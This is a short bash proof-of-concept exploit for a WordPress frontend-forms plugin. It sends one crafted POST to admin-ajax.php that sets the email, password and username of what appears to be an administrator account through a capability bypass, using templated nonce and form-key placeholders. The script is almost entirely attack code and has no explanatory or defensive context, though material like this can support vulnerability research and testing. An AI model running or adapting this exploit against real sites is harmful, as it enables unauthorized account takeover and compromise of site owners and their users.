#!/usr/bin/env bash
# PoC: acf-frontend-form-element wp.auth.numeric_cap_bypass
set -euo pipefail
BASE="${TARGET_URL:-http://localhost:8000}"

echo "=== 1) Send exploit payload ==="
curl -sS -D - -X POST --data-urlencode "action=frontend_admin/form_submit" --data-urlencode "_acf_form={{acf_form_key}}" --data-urlencode "_acf_nonce={{acf_form_nonce}}" --data-urlencode "_acf_status=publish" --data-urlencode "_acf_objects={{acf_objects_encrypted}}" --data-urlencode "edit_user_password=1" --data-urlencode "acff[post][{{acf_email_field_key}}]=iridium_acf_ato@example.com" --data-urlencode "acff[post][{{acf_password_field_key}}]=IridiumAcfAto1!" --data-urlencode "acff[post][{{acf_username_field_key}}]=iridium_acf_ato_admin" "$BASE/wp-admin/admin-ajax.php" | head -c 2000
echo

echo "Success: check output above for expected vulnerability impact."
